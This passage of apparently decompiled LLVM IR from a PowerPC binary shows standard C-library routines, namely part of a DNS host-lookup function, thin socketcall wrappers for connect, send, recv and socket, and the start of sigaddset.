  br i1 %v3_1000dd30, label %dec_label_pc_1000dd38, label %dec_label_pc_1000dfd0

dec_label_pc_1000dd38:                            ; preds = %dec_label_pc_1000dd2c, %dec_label_pc_1000dd1c, %dec_label_pc_1000dd10
  %v0_1000dd38 = load i32, i32* @r30, align 4
  %v1_1000dd38 = sub i32 0, %v0_1000dd38
  store i32 %v1_1000dd38, i32* %r0.global-to-local, align 4
  %v0_1000dd3c = load i32, i32* @r27, align 4
  %v1_1000dd3c = load i32, i32* @r28, align 4
  %v2_1000dd3c = inttoptr i32 %v1_1000dd3c to i32*
  store i32 %v0_1000dd3c, i32* %v2_1000dd3c, align 4
  %v0_1000dd40 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dd40 = urem i32 %v0_1000dd40, 4
  store i32 %v1_1000dd40, i32* %r0.global-to-local, align 4
  %v3_1000dd40 = icmp eq i32 %v1_1000dd40, 0
  %v0_1000dd58.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000dd40, label %dec_label_pc_1000dd58, label %dec_label_pc_1000dd48

dec_label_pc_1000dd48:                            ; preds = %dec_label_pc_1000dd38
  %v2_1000dd48 = icmp ult i32 %v0_1000dd58.pre, %v1_1000dd40
  br i1 %v2_1000dd48, label %dec_label_pc_1000dfcc, label %dec_label_pc_1000dd50

dec_label_pc_1000dd50:                            ; preds = %dec_label_pc_1000dd48
  %v2_1000dd50 = sub i32 %v0_1000dd58.pre, %v1_1000dd40
  store i32 %v2_1000dd50, i32* @r29, align 4
  %v0_1000dd54 = load i32, i32* @r30, align 4
  %v2_1000dd54 = add i32 %v0_1000dd54, %v1_1000dd40
  store i32 %v2_1000dd54, i32* @r30, align 4
  br label %dec_label_pc_1000dd58

dec_label_pc_1000dd58:                            ; preds = %dec_label_pc_1000dd38, %dec_label_pc_1000dd50
  %v0_1000dd58 = phi i32 [ %v2_1000dd50, %dec_label_pc_1000dd50 ], [ %v0_1000dd58.pre, %dec_label_pc_1000dd38 ]
  %v1_1000dd60 = load i32, i32* @r24, align 4
  %v2_1000dd60 = inttoptr i32 %v1_1000dd60 to i32*
  store i32 -1, i32* %v2_1000dd60, align 4
  %tmp29 = icmp ult i32 %v0_1000dd58, 4
  br i1 %tmp29, label %dec_label_pc_1000dfcc, label %dec_label_pc_1000dd68

dec_label_pc_1000dd68:                            ; preds = %dec_label_pc_1000dd58
  %v0_1000dd68 = load i32, i32* @r29, align 4
  %v1_1000dd68 = add i32 %v0_1000dd68, -4
  store i32 %v1_1000dd68, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000dd68, 8
  br i1 %tmp30, label %dec_label_pc_1000dfcc, label %dec_label_pc_1000dd74

dec_label_pc_1000dd74:                            ; preds = %dec_label_pc_1000dd68
  %v1_1000dd74 = add i32 %v0_1000dd68, -12
  store i32 %v1_1000dd74, i32* %r0.global-to-local, align 4
  %v0_1000dd78 = load i32, i32* @r30, align 4
  %v1_1000dd78 = add i32 %v0_1000dd78, 4
  store i32 %v1_1000dd78, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000dd84 = inttoptr i32 %v1_1000dd78 to i32*
  store i32 %v0_1000dd78, i32* %v3_1000dd84, align 4
  %v0_1000dd88 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000dd88 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000dd88 = add i32 %v1_1000dd88, 4
  %v3_1000dd88 = inttoptr i32 %v2_1000dd88 to i32*
  store i32 %v0_1000dd88, i32* %v3_1000dd88, align 4
  %tmp31 = icmp ult i32 %v1_1000dd74, 32
  br i1 %tmp31, label %dec_label_pc_1000dfcc, label %dec_label_pc_1000dd90

dec_label_pc_1000dd90:                            ; preds = %dec_label_pc_1000dd74
  %v0_1000dd90 = load i32, i32* @r29, align 4
  %v1_1000dd90 = add i32 %v0_1000dd90, -44
  %tmp32 = icmp ult i32 %v1_1000dd90, 256
  br i1 %tmp32, label %dec_label_pc_1000dfcc, label %dec_label_pc_1000dd9c

dec_label_pc_1000dd9c:                            ; preds = %dec_label_pc_1000dd90
  %v0_1000dd9c = load i32, i32* @r30, align 4
  %v1_1000dd9c = add i32 %v0_1000dd9c, 44
  store i32 %v1_1000dd9c, i32* @r31, align 4
  %v0_1000dda0 = load i32, i32* @r23, align 4
  store i32 %v0_1000dda0, i32* @r4, align 4
  %v1_1000dda8 = add i32 %v0_1000dd9c, 12
  store i32 %v1_1000dda8, i32* %r21.global-to-local, align 4
  store i32 %v1_1000dd9c, i32* %r3.global-to-local, align 4
  store i32 268492212, i32* @lr, align 4
  %v3_1000ddb0 = call i32 @strncpy(i32 %v1_1000dd9c, i32 %v0_1000dda0, i32 %v1_1000dd90)
  %v0_1000ddb4 = load i32, i32* @r31, align 4
  %v1_1000ddb4 = load i32, i32* @r30, align 4
  %v2_1000ddb4 = add i32 %v1_1000ddb4, 12
  %v3_1000ddb4 = inttoptr i32 %v2_1000ddb4 to i32*
  store i32 %v0_1000ddb4, i32* %v3_1000ddb4, align 4
  %v0_1000ddb8 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000ddb8 = load i32, i32* %r21.global-to-local, align 4
  %v2_1000ddb8 = add i32 %v1_1000ddb8, 4
  %v3_1000ddb8 = inttoptr i32 %v2_1000ddb8 to i32*
  store i32 %v0_1000ddb8, i32* %v3_1000ddb8, align 4
  %v0_1000ddbc = load i32, i32* @r23, align 4
  store i32 %v0_1000ddbc, i32* %r3.global-to-local, align 4
  %v0_1000ddc0 = load i32, i32* @r30, align 4
  store i32 %v0_1000ddc0, i32* @r4, align 4
  store i32 268492232, i32* @lr, align 4
  %v2_1000ddc4 = inttoptr i32 %v0_1000ddbc to i8*
  %v3_1000ddc4 = call i32 @inet_aton(i8* %v2_1000ddc4)
  store i32 %v3_1000ddc4, i32* %r3.global-to-local, align 4
  store i32 %v3_1000ddc4, i32* %r22.global-to-local, align 4
  %v3_1000ddc8 = icmp eq i32 %v3_1000ddc4, 0
  br i1 %v3_1000ddc8, label %dec_label_pc_1000ddfc, label %dec_label_pc_1000ddd0

dec_label_pc_1000ddd0:                            ; preds = %dec_label_pc_1000dd9c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000ddd8 = load i32, i32* @r26, align 4
  %v2_1000ddd8 = add i32 %v1_1000ddd8, 8
  %v3_1000ddd8 = inttoptr i32 %v2_1000ddd8 to i32*
  store i32 2, i32* %v3_1000ddd8, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000dde0 = load i32, i32* @r31, align 4
  %v1_1000dde0 = load i32, i32* @r26, align 4
  %v2_1000dde0 = inttoptr i32 %v1_1000dde0 to i32*
  store i32 %v0_1000dde0, i32* %v2_1000dde0, align 4
  %v0_1000dde4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dde4 = load i32, i32* @r26, align 4
  %v2_1000dde4 = add i32 %v1_1000dde4, 12
  %v3_1000dde4 = inttoptr i32 %v2_1000dde4 to i32*
  store i32 %v0_1000dde4, i32* %v3_1000dde4, align 4
  %v0_1000dde8 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000dde8 = load i32, i32* @r26, align 4
  %v2_1000dde8 = add i32 %v1_1000dde8, 16
  %v3_1000dde8 = inttoptr i32 %v2_1000dde8 to i32*
  store i32 %v0_1000dde8, i32* %v3_1000dde8, align 4
  %v0_1000ddec = load i32, i32* %r21.global-to-local, align 4
  %v1_1000ddec = load i32, i32* @r26, align 4
  %v2_1000ddec = add i32 %v1_1000ddec, 4
  %v3_1000ddec = inttoptr i32 %v2_1000ddec to i32*
  store i32 %v0_1000ddec, i32* %v3_1000ddec, align 4
  %v0_1000ddf0 = load i32, i32* @r26, align 4
  %v1_1000ddf0 = load i32, i32* @r20, align 4
  %v2_1000ddf0 = inttoptr i32 %v1_1000ddf0 to i32*
  store i32 %v0_1000ddf0, i32* %v2_1000ddf0, align 4
  %v0_1000ddf4 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000ddf4 = load i32, i32* @r24, align 4
  %v2_1000ddf4 = inttoptr i32 %v1_1000ddf4 to i32*
  store i32 %v0_1000ddf4, i32* %v2_1000ddf4, align 4
  br label %dec_label_pc_1000dfd0

dec_label_pc_1000ddfc:                            ; preds = %dec_label_pc_1000dd9c
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268492292, i32* @lr, align 4
  %v0_1000de00 = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_1002e570.869 to i32), i32* %r29.global-to-local, align 4
  %v2_1000de08 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000de08, i32* %r28.global-to-local, align 4
  store i32 %v2_1000de08, i32* @r3, align 4
  %v0_1000de1c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1002e570.869 to i32), i32* %r3.global-to-local, align 4
  %v0_1000de24 = call i32 @__pthread_return_0()
  %v3_1000de2c = load i32, i32* @global_var_1002e654.870, align 4
  store i32 %v3_1000de2c, i32* %r29.global-to-local, align 4
  store i32 %v2_1000de08, i32* @r3, align 4
  %v0_1000de38 = call i32 @__pthread_return_void()
  %v0_1000de40 = load i32, i32* @r23, align 4
  store i32 %v0_1000de40, i32* %r3.global-to-local, align 4
  %v2_1000de50 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000de54 = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000de58 = load i32, i32* %r22.global-to-local, align 4
  store i32 268492392, i32* @lr, align 4
  %v6_1000de64 = inttoptr i32 %v0_1000de40 to i8*
  %v7_1000de64 = call i32 @__dns_lookup(i8* %v6_1000de64, i32 1, i32 %v3_1000de2c, i32 ptrtoint (i32* @global_var_10034950.871 to i32), i32 %v2_1000de50, i32 %v2_1000de54)
  store i32 %v7_1000de64, i32* %r3.global-to-local, align 4
  %v1_1000de68 = icmp slt i32 %v7_1000de64, 0
  br i1 %v1_1000de68, label %dec_label_pc_1000dfb0, label %dec_label_pc_1000de70

dec_label_pc_1000de70:                            ; preds = %dec_label_pc_1000ddfc
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000de78 = add i32 %tmp19, 4
  %v2_1000de7c = mul i32 %v0_1000de58, %v1_1000de78
  %v1_1000de80 = add i32 %v2_1000de7c, 256
  %v1_1000de84 = load i32, i32* @r27, align 4
  %v3_1000de84 = icmp ugt i32 %v1_1000de80, %v1_1000de84
  br i1 %v3_1000de84, label %dec_label_pc_1000de8c, label %dec_label_pc_1000dea8

dec_label_pc_1000de8c:                            ; preds = %dec_label_pc_1000de70
  %v3_1000de8c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000de8c, i32* @r3, align 4
  store i32 268492436, i32* @lr, align 4
  %v0_1000de90 = call i32 @free()
  %v3_1000de94 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000de94, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000de9c.872 to i32), i32* @lr, align 4
  %v0_1000de98 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000dea0 = load i32, i32* @r19, align 4
  %v1_1000dea0 = load i32, i32* @r24, align 4
  %v2_1000dea0 = inttoptr i32 %v1_1000dea0 to i32*
  store i32 %v0_1000dea0, i32* %v2_1000dea0, align 4
  br label %dec_label_pc_1000dfd0

dec_label_pc_1000dea8:                            ; preds = %dec_label_pc_1000de70
  %v3_1000dea8 = icmp eq i32 %v0_1000de58, 0
  br i1 %v3_1000dea8, label %dec_label_pc_1000dea8.dec_label_pc_1000df4c_crit_edge, label %dec_label_pc_1000deb0

dec_label_pc_1000dea8.dec_label_pc_1000df4c_crit_edge: ; preds = %dec_label_pc_1000dea8
  %v0_1000df54.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000df4c

dec_label_pc_1000deb0:                            ; preds = %dec_label_pc_1000dea8
  %v2_1000deb0 = mul i32 %v0_1000de58, %tmp19
  store i32 %v2_1000deb0, i32* @r5, align 4
  %v0_1000deb4 = load i32, i32* @r30, align 4
  %v1_1000deb4 = add i32 %v0_1000deb4, 36
  store i32 %v1_1000deb4, i32* %r3.global-to-local, align 4
  %v0_1000deb8 = load i32, i32* @r31, align 4
  store i32 268492480, i32* @lr, align 4
  %v2_1000debc = call i32 @memmove(i32 %v1_1000deb4, i32 %v0_1000deb8)
  store i32 %v2_1000debc, i32* %r3.global-to-local, align 4
  store i32 %v2_1000deb0, i32* %r0.global-to-local, align 4
  %v0_1000decc = load i32, i32* @r30, align 4
  %v1_1000decc = load i32, i32* @r31, align 4
  %v3_1000decc = add i32 %v1_1000decc, %v2_1000deb0
  %v4_1000decc = inttoptr i32 %v3_1000decc to i32*
  store i32 %v0_1000decc, i32* %v4_1000decc, align 4
  %v0_1000ded0 = load i32, i32* @r31, align 4
  %v1_1000ded0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000ded0 = add i32 %v1_1000ded0, %v0_1000ded0
  store i32 %v2_1000ded0, i32* @r25, align 4
  %v1_1000ded8 = add i32 %v0_1000de58, -1
  store i32 %v1_1000ded8, i32* %r11.global-to-local, align 4
  %v1_1000dedc = add i32 %v0_1000de58, 1
  %v2_1000dee0 = icmp sgt i32 %v1_1000ded8, -1
  store i32 %v1_1000dedc, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000dee0, label %dec_label_pc_1000df10.preheader, label %dec_label_pc_1000deec

dec_label_pc_1000deec:                            ; preds = %dec_label_pc_1000deb0
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000df10.preheader

dec_label_pc_1000df10.preheader:                  ; preds = %dec_label_pc_1000deec, %dec_label_pc_1000deb0
  %v0_1000df186 = phi i32 [ 1, %dec_label_pc_1000deec ], [ %v1_1000dedc, %dec_label_pc_1000deb0 ]
  %v1_1000df103 = mul i32 %v1_1000ded8, 4
  store i32 %v1_1000df103, i32* %r0.global-to-local, align 4
  %v2_1000df145 = add i32 %v2_1000ded0, %v1_1000df103
  %v1_1000df187 = add i32 %v0_1000df186, -1
  store i32 %v1_1000df187, i32* %ctr.global-to-local, align 4
  %v2_1000df188 = icmp eq i32 %v1_1000df187, 0
  br i1 %v2_1000df188, label %dec_label_pc_1000df1c, label %dec_label_pc_1000def8

dec_label_pc_1000def8:                            ; preds = %dec_label_pc_1000df10.preheader, %dec_label_pc_1000def8.dec_label_pc_1000def8_crit_edge
  %v1_1000df0c = phi i32 [ %v2_1000df14, %dec_label_pc_1000def8.dec_label_pc_1000def8_crit_edge ], [ %v2_1000df145, %dec_label_pc_1000df10.preheader ]
  %v0_1000df04 = phi i32 [ %v0_1000df04.pre, %dec_label_pc_1000def8.dec_label_pc_1000def8_crit_edge ], [ %v0_1000ded0, %dec_label_pc_1000df10.preheader ]
  %v0_1000defc = phi i32 [ %v0_1000df10, %dec_label_pc_1000def8.dec_label_pc_1000def8_crit_edge ], [ %v1_1000ded8, %dec_label_pc_1000df10.preheader ]
  %v2_1000defc = mul i32 %v0_1000defc, %tmp19
  %v1_1000df00 = add i32 %v0_1000defc, -1
  store i32 %v1_1000df00, i32* %r11.global-to-local, align 4
  %v2_1000df04 = add i32 %v0_1000df04, -8
  %v1_1000df08 = add i32 %v2_1000df04, %v2_1000defc
  %v2_1000df0c = add i32 %v1_1000df0c, 4
  %v3_1000df0c = inttoptr i32 %v2_1000df0c to i32*
  store i32 %v1_1000df08, i32* %v3_1000df0c, align 4
  %v0_1000df10 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000df10 = mul i32 %v0_1000df10, 4
  store i32 %v1_1000df10, i32* %r0.global-to-local, align 4
  %v1_1000df14 = load i32, i32* @r25, align 4
  %v0_1000df18 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000df18 = add i32 %v0_1000df18, -1
  store i32 %v1_1000df18, i32* %ctr.global-to-local, align 4
  %v2_1000df18 = icmp eq i32 %v1_1000df18, 0
  br i1 %v2_1000df18, label %dec_label_pc_1000df1c, label %dec_label_pc_1000def8.dec_label_pc_1000def8_crit_edge

dec_label_pc_1000def8.dec_label_pc_1000def8_crit_edge: ; preds = %dec_label_pc_1000def8
  %v2_1000df14 = add i32 %v1_1000df14, %v1_1000df10
  %v0_1000df04.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000def8

dec_label_pc_1000df1c:                            ; preds = %dec_label_pc_1000def8, %dec_label_pc_1000df10.preheader
  %v1_1000df28 = phi i32 [ %v2_1000ded0, %dec_label_pc_1000df10.preheader ], [ %v1_1000df14, %dec_label_pc_1000def8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000df24 = mul i32 %v0_1000de58, 4
  %v2_1000df28 = add i32 %v1_1000df24, 4
  %v2_1000df2c = add i32 %v2_1000df28, %v1_1000df28
  %v3_1000df2c = inttoptr i32 %v2_1000df2c to i32*
  store i32 0, i32* %v3_1000df2c, align 4
  %v0_1000df38 = load i32, i32* @r25, align 4
  %v2_1000df38 = add i32 %v0_1000df38, %v1_1000df24
  store i32 %v2_1000df38, i32* %r11.global-to-local, align 4
  %v1_1000df3c = load i32, i32* @r31, align 4
  %v2_1000df3c = sub i32 %v1_1000df3c, %v2_1000df38
  %v1_1000df40 = add i32 %v2_1000df38, 8
  store i32 %v1_1000df40, i32* @r31, align 4
  %v0_1000df44 = load i32, i32* @r27, align 4
  %v2_1000df44 = add i32 %v0_1000df44, %v2_1000df3c
  %v1_1000df48 = add i32 %v2_1000df44, -8
  br label %dec_label_pc_1000df4c

dec_label_pc_1000df4c:                            ; preds = %dec_label_pc_1000dea8.dec_label_pc_1000df4c_crit_edge, %dec_label_pc_1000df1c
  %v0_1000df54 = phi i32 [ %v0_1000df54.pre, %dec_label_pc_1000dea8.dec_label_pc_1000df4c_crit_edge ], [ %v1_1000df40, %dec_label_pc_1000df1c ]
  %v0_1000df50 = phi i32 [ %v1_1000de84, %dec_label_pc_1000dea8.dec_label_pc_1000df4c_crit_edge ], [ %v1_1000df48, %dec_label_pc_1000df1c ]
  %v3_1000df4c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000df4c, i32* @r4, align 4
  store i32 %v0_1000df54, i32* %r3.global-to-local, align 4
  store i32 268492636, i32* @lr, align 4
  %v3_1000df58 = call i32 @strncpy(i32 %v0_1000df54, i32 %v3_1000df4c, i32 %v0_1000df50)
  %v3_1000df5c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000df5c, i32* @r3, align 4
  store i32 268492644, i32* @lr, align 4
  %v0_1000df60 = call i32 @free()
  store i32 %v0_1000df60, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000df68 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000df68, label %dec_label_pc_1000df70, label %dec_label_pc_1000dfb8

dec_label_pc_1000df70:                            ; preds = %dec_label_pc_1000df4c
  store i32 4, i32* @r5, align 4
  %v0_1000df78 = load i32, i32* @r30, align 4
  store i32 %v0_1000df78, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000df80.873 to i32), i32* @lr, align 4
  %v0_1000df7c = call i32 @memcpy()
  %v1_1000df84 = load i32, i32* @r26, align 4
  %v2_1000df84 = add i32 %v1_1000df84, 8
  %v3_1000df84 = inttoptr i32 %v2_1000df84 to i32*
  store i32 2, i32* %v3_1000df84, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000df8c = load i32, i32* @r26, align 4
  %v2_1000df8c = add i32 %v1_1000df8c, 12
  %v3_1000df8c = inttoptr i32 %v2_1000df8c to i32*
  store i32 4, i32* %v3_1000df8c, align 4
  %v0_1000df90 = load i32, i32* @r31, align 4
  %v1_1000df90 = load i32, i32* @r26, align 4
  %v2_1000df90 = inttoptr i32 %v1_1000df90 to i32*
  store i32 %v0_1000df90, i32* %v2_1000df90, align 4
  %v0_1000df94 = load i32, i32* @r25, align 4
  %v1_1000df94 = load i32, i32* @r26, align 4
  %v2_1000df94 = add i32 %v1_1000df94, 16
  %v3_1000df94 = inttoptr i32 %v2_1000df94 to i32*
  store i32 %v0_1000df94, i32* %v3_1000df94, align 4
  %v0_1000df98 = load i32, i32* @r21, align 4
  %v1_1000df98 = load i32, i32* @r26, align 4
  %v2_1000df98 = add i32 %v1_1000df98, 4
  %v3_1000df98 = inttoptr i32 %v2_1000df98 to i32*
  store i32 %v0_1000df98, i32* %v3_1000df98, align 4
  %v3_1000df9c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000df9c, i32* @r3, align 4
  store i32 268492708, i32* @lr, align 4
  %v0_1000dfa0 = call i32 @free()
  store i32 %v0_1000dfa0, i32* %r3.global-to-local, align 4
  %v0_1000dfa4 = load i32, i32* @r26, align 4
  %v1_1000dfa4 = load i32, i32* @r20, align 4
  %v2_1000dfa4 = inttoptr i32 %v1_1000dfa4 to i32*
  store i32 %v0_1000dfa4, i32* %v2_1000dfa4, align 4
  br label %dec_label_pc_1000dfb0

dec_label_pc_1000dfb0:                            ; preds = %dec_label_pc_1000dfb8, %dec_label_pc_1000ddfc, %dec_label_pc_1000df70
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000df70 ], [ 2, %dec_label_pc_1000ddfc ], [ 2, %dec_label_pc_1000dfb8 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000df70 ], [ 1, %dec_label_pc_1000ddfc ], [ 1, %dec_label_pc_1000dfb8 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000dfb0 = load i32, i32* @r24, align 4
  %v2_1000dfb0 = inttoptr i32 %v1_1000dfb0 to i32*
  store i32 %storemerge, i32* %v2_1000dfb0, align 4
  br label %dec_label_pc_1000dfd0

dec_label_pc_1000dfb8:                            ; preds = %dec_label_pc_1000df4c
  %v3_1000dfb8 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000dfb8, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000dfc0.874 to i32), i32* @lr, align 4
  %v0_1000dfbc = call i32 @free()
  store i32 %v0_1000dfbc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000dfb0

dec_label_pc_1000dfcc:                            ; preds = %dec_label_pc_1000dd90, %dec_label_pc_1000dd74, %dec_label_pc_1000dd68, %dec_label_pc_1000dd58, %dec_label_pc_1000dd48
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000dfd0

dec_label_pc_1000dfd0:                            ; preds = %dec_label_pc_1000dd2c, %dec_label_pc_1000dd24, %dec_label_pc_1000dcd8, %entry, %dec_label_pc_1000dfb0, %dec_label_pc_1000de8c, %dec_label_pc_1000ddd0, %dec_label_pc_1000dfcc
  store i32 %v0_1000dca4, i32* %r0.global-to-local, align 4
  %v0_1000dfe0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000dfe0

; uselistorder directives
  uselistorder i32 %v0_1000df54, { 1, 0 }
  uselistorder i32 %v1_1000df24, { 1, 0 }
  uselistorder i32 %v1_1000df18, { 1, 0 }
  uselistorder i32 %v1_1000df10, { 1, 0 }
  uselistorder i32 %v0_1000defc, { 1, 0 }
  uselistorder i32 %v1_1000df103, { 1, 0 }
  uselistorder i32 %v1_1000ded8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000ded0, { 1, 0, 2 }
  uselistorder i32 %v0_1000de58, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000dd9c, { 1, 0, 2 }
  uselistorder i32 %v0_1000dd58.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000dd40, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 3, 4, 5, 6, 1, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000dfd0, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000dfb0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000df4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000def8, { 1, 0 }
  uselistorder label %dec_label_pc_1000dd58, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000dff8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492808, i32* @lr, align 4
  %v2_1000e004 = call i32 @__socketcall(i32 3, i32 %v2_1000dff8)
  ret i32 %v2_1000e004

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000e02c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492860, i32* @lr, align 4
  %v2_1000e038 = call i32 @__socketcall(i32 6, i32 %v2_1000e02c)
  ret i32 %v2_1000e038

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000e060 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268492920, i32* @lr, align 4
  %v2_1000e074 = call i32 @__socketcall(i32 15, i32 %v2_1000e060)
  ret i32 %v2_1000e074

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000e09c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268492976, i32* @lr, align 4
  %v2_1000e0ac = call i32 @__socketcall(i32 10, i32 %v2_1000e09c)
  ret i32 %v2_1000e0ac

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000e0d4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268493032, i32* @lr, align 4
  %v2_1000e0e4 = call i32 @__socketcall(i32 9, i32 %v2_1000e0d4)
  ret i32 %v2_1000e0e4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000e10c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268493096, i32* @lr, align 4
  %v2_1000e124 = call i32 @__socketcall(i32 11, i32 %v2_1000e10c)
  ret i32 %v2_1000e124

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000e14c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268493156, i32* @lr, align 4
  %v2_1000e160 = call i32 @__socketcall(i32 14, i32 %v2_1000e14c)
  ret i32 %v2_1000e160

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000e188 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268493208, i32* @lr, align 4
  %v2_1000e194 = call i32 @__socketcall(i32 1, i32 %v2_1000e188)
  ret i32 %v2_1000e194

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000e1d8, label %dec_label_pc_1000e1c4

dec_label_pc_1000e1c4:                            ; preds = %entry
  %v0_1000e1c4 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000e1d0 = inttoptr i32 %v0_1000e1c4 to i32*
  store i32 22, i32* %v2_1000e1d0, align 4
  %v0_1000e1e4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e1e0

dec_label_pc_1000e1d8:                            ; preds = %entry
  %v0_1000e1d8 = call i32 @__sigaddset()
  store i32 %v0_1000e1d8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e1e0

